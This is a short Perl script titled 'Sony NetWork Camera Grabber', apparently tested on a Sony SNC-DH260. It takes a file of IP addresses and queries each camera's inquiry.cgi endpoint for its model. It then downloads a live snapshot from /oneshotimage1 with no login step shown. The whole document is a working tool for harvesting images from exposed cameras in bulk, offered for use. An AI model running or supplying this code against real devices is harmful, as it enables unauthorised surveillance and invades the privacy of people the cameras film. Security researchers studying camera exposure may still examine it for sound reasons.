#!/usr/bin/perl
# Tested on Sony Network Camera SNC-DH260

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n       Sony NetWork Camera Grabber\n\n\n";


open(op,"<$ARGV[0]") or die "$!";
while(<op>){
chomp($ips = $_);

$ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

$req = $ua->get("http://".$ips."/command/inquiry.cgi?inqjs=system")->content;

if($req =~m/var TitleBar=\"(.*?)\"/g) {

$model = $1;

print "  [".$ips."] => ".$model." \n";

$req2 = $ua->mirror("http://".$ips."/oneshotimage1","snapshot_sony.jpg");
if($req2->is_success) {
 
    print " \n\t Snapshot Saved";


}

}
}
